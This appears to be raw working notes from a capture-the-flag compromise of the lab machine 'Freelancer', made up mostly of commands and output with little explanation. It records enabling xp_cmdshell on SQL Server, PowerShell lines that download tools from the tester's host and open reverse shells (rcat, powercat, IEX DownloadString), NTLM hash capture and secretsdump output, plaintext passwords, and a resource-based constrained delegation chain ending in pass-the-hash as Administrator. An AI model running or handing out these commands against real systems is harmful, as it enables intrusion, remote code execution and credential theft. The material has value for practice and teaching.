@@ -1,0 +1,257 @@
+┌──(milo㉿Kali2023)-[~]
+└─$ sudo nmap -A 10.10.11.5 -T5 -p 1-65535
+[sudo] password for milo: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-03 12:25 CEST
+Warning: 10.10.11.5 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.5
+Host is up (0.044s latency).
+Not shown: 64605 closed tcp ports (reset), 904 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-03 15:26:01Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49672/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2024-06-03T15:27:03+00:00; +5h00m01s from scanner time.
+| ms-sql-info: 
+|   10.10.11.5\SQLEXPRESS: 
+|     Instance name: SQLEXPRESS
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|     TCP port: 55297
+|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
+|_    Clustered: false
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-06-03T13:24:06
+|_Not valid after:  2054-06-03T13:24:06
+| ms-sql-ntlm-info: 
+|   10.10.11.5\SQLEXPRESS: 
+|     Target_Name: FREELANCER
+|     NetBIOS_Domain_Name: FREELANCER
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: freelancer.htb
+|     DNS_Computer_Name: DC.freelancer.htb
+|     DNS_Tree_Name: freelancer.htb
+|_    Product_Version: 10.0.17763
+63458/tcp open  msrpc         Microsoft Windows RPC
+63462/tcp open  msrpc         Microsoft Windows RPC
+Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 5h00m00s
+| smb2-time: 
+|   date: 2024-06-03T15:26:56
+|_  start_date: N/A
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT      ADDRESS
+1   44.27 ms 10.10.14.1
+2   44.33 ms 10.10.11.5
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.88 seconds
+                   
+                   
+ http://freelancer.htb/accounts/login/otp/Mg==/1e1cb347546861136c0eae05f9cf2466/  
+ http://freelancer.htb/accounts/login/otp/Mg==/9ff44d2e895d7275ac644d19612602ba/         
+ 
+ Camellia19970
+ Camellia@athento.com
+ pbkdf2_sha256$600000$4KqR8oqlwUMVVjZuzbz4Wu$2mdmIWr5SyIdLBngGve3pZyS1KaOO4+hlXgmxAeGtVs=
+ 
+ tomHazard
+ tomHazard@freelancer.htb
+ pbkdf2_sha256$600000$tip7FkNIoN7nKNTLckQuiY$Q6g1Qx0B8ul/qxGQ0hX4lYoHc3jxkrWaf3lZvNknfWU=
+ 
+ admin
+ johnHalond@freelancer.htb
+ pbkdf2_sha256$600000$IgjtPcBB9VySMPXoeAc8PL$pmpMU81uwwKvdxUBNVk/K4Wwh4pw/fWIseSx4XkyMJo=
+ 
+ milo
+ pbkdf2_sha256$600000$urGdXeOyJYsU9C7dYPG25n$uGcq8aIZHlt+zUCgcgXAaatbAb1KnoS4Sn9pFcJzs9k=
+ 
+ select user_name();
+ Freelancer_webapp_user
+ 
+ EXEC sp_linkedservers
+ SRV_NAME	SRV_PROVIDERNAME	SRV_PRODUCT	SRV_DATASOURCE	SRV_PROVIDERSTRING	SRV_LOCATION	SRV_CAT
+DC\SQLEXPRESS	SQLNCLI	SQL Server	DC\SQLEXPRESS	null	null	null
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+
+xp_dirtree '\\10.10.14.66\milo'
+
+[SMB] NTLMv2-SSP Client   : 10.129.161.252
+[SMB] NTLMv2-SSP Username : FREELANCER\sql_svc
+[SMB] NTLMv2-SSP Hash     : sql_svc::FREELANCER:47e7c35036b850cc:7A6BAEB70C9DF52FDB6C801FE757B713:010100000000000080D27574B7B6DA0188E7109983BC730B0000000002000800500036005500440001001E00570049004E002D004E004C004C004B004100430047004C0052004500460004003400570049004E002D004E004C004C004B004100430047004C005200450046002E0050003600550044002E004C004F00430041004C000300140050003600550044002E004C004F00430041004C000500140050003600550044002E004C004F00430041004C000700080080D27574B7B6DA010600040002000000080030003000000000000000000000000030000048C2856F5095559B1FE402C7DB73E467A67641A74E19C7D04DD0C93C3EC22C870A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360036000000000000000000 
+
+
+ 
+django_migrations
+freelancer_otptoken
+django_content_type
+django_admin_log
+auth_permission
+django_session
+
+alias C:/apps/freelancer/freelancer/static/
+06/05/2024 01:42 AM
+Administrator
+05/28/2024 10:23 AM
+lkazanof
+05/28/2024 10:23 AM
+lorra199
+05/28/2024 10:22 AM
+mikasaAckerman
+08/27/2023 01:16 AM
+MSSQLSERVER
+05/28/2024 02:13 PM
+Public
+05/28/2024 10:22 AM
+sqlbackupoperator
+05/28/2024 11:16 AM
+sql_svc
+
+
+ 
+ Freelancer_webapp_user
+ 
+execute as login = 'sa'
+execute sp_configure 'show advanced options', '1'
+RECONFIGURE
+execute sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+execute xp_cmdshell "whoami"
+
+
+execute xp_cmdshell 'powershell iwr -uri http://10.10.14.66:8000/rcat.zip -outfile c:\temp\rcat.zip'
+execute xp_cmdshell 'powershell cd c:\temp\; Expand-Archive -Force c:\temp\rcat.zip; ls '
+execute xp_cmdshell 'powershell  c:\temp\rcat\rcat.exe 10.10.14.66 4433 -e powershell '
+
+
+
+execute xp_cmdshell 'powershell iwr -uri http://10.10.14.66:8000/powercat.ps1 -outfile c:\temp\powercat.ps1' 
+
+
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.66:8000/powercat.ps1');powercat -c 10.10.14.66 -p 4443 -e cmd"
+
+
+iwr -uri http://10.10.14.66:8000/winPEAS.ps1 -outfile c:\temp\winpeas.ps1 
+
+
+ 
+ 
+Possible Password found: PHP Passwords
+C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI
+PHP Passwords triggered
+SQLSVCACCOUNT="FREELANCER\sql_svc"
+> SQLSVCPASSWORD="IL0v3ErenY3ager"
+SQLSYSADMINACCOUNTS="FREELANCER\Administrator" SECURITYMODE="SQL"
+> SAPWD="t3mp0r@ryS@PWD"
+ADDCURRENTUSERASSQLADMIN="False"
+ 
+ $SecPass = ConvertTo-SecureString "IL0v3ErenY3ager" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("mikasaAckerman,$SecPass)
+Start-Process -FilePath "powershell" -argumentlist "c:\temp\rcat\rcat.exe 10.10.14.66 4433 -e cmd " -Credential $cred
+ 
+ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.66:8000/rev.ps1')" -Credential $cred
+ 
+                                    
+start-process powershell -argumentlist "copy-itme c:\users\mikasaAcerman\Desktop\user.txt -destination c:\temp\" -credential $cred
+
+
+iwr http://10.10.14.66:8000/RunasCs-master/RunasCs.exe -outfile c:\temp\runascs.exe
+./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.66:9100
+
+./memprocfs -device /home/milo/HTB/MEMORY.DMP -mount /home/milo/HTB/freelancer
+
+└─$ impacket-secretsdump -sam /home/milo/HTB/freelancer/registry/hive_files/0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system /home/milo/HTB/freelancer/registry/hive_files/0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
+[*] Dumping cached domain logon information (domain/username:hash)
+FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361
+FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1
+FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
+dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
+[*] NL$KM 
+ 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
+ 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
+ 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &.........z.I.C.
+ 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c 
+NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
+[*] _SC_MSSQL$DATA 
+(Unknown User):PWN3D#l0rr@Armessa199
+[*] Cleaning up... 
+
+
+1865  impacket-secretsdump -sam /home/milo/HTB/freelancer/registry/hive_files/0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system /home/milo/HTB/freelancer/registry/hive_files/0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
+ 1866  evil-winrm -i 10.10.11.5 -u lorra199 -p 'PWN3D#l0rr@Armessa199'
+ 1867  impacket-addcomputer -computer-name 'milo' -computer-pass 'MiloTheHacker11!' -dc-host freelancer.htb -domain-netbios freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
+ 1868  impacket-addcomputer -computer-name 'milo' -computer-pass 'MiloTheHacker11!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
+ 1869  impacket-rbcd -delegate-from 'milo' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'\n
+ 1870  impacket-rbcd -delegate-from 'milo$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'\n
+ 1871  faketime -f +5h impacket-getST -span 'cifs/dc.freelancer.htb' -imersonte Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO$:'MiloTheHacker11!'
+ 1872  faketime -f +5h impacket-getST -spn 'cifs/dc.freelancer.htb' -imersonte Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO$:'MiloTheHacker11!'
+ 1873  faketime -f +5h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO$:'MiloTheHacker11!'
+ 1874  faketime -f +5h impacket-secretsdump 'freelancer.htb/Administraotr@DC.frelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -targer-ip 10.10.11.5 -just-dc-ntlm
+ 1875  faketime -f +5h impacket-secretsdump 'freelancer.htb/Administraotr@DC.frelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
+ 1876  impacket-addcomputer -computer-name 'milo$' -computer-pass 'MiloTheHacker11!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
+ 1877  impacket-addcomputer -computer-name 'milo1$' -computer-pass 'MiloTheHacker11!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
+ 1878  impacket-rbcd -delegate-from 'milo1$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'\n
+ 1879  faketime -f +5h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/milo1$:'MiloTheHacker11!'
+ 1880  faketime -f +2h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO1$:'MiloTheHacker11!'
+ 1881  faketime -f +3h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO1$:'MiloTheHacker11!'
+ 1882  impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO1$:'MiloTheHacker11!'
+ 1883  impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO$:'MiloTheHacker11!'
+ 1884  faketime -f +1h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO1$:'MiloTheHacker11!'
+ 1885  ntpdate -u freelancer.htb
+ 1886  export KRB5CCNAME=Administrator.ccache
+ 1887  faketime -f +5h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/MILO1$:'MiloTheHacker11!'
+ 1888  evil-winrm -i 10.10.11.5 -u administrator -H '0039318f1e8274633445bce32ad1a290'
+
+
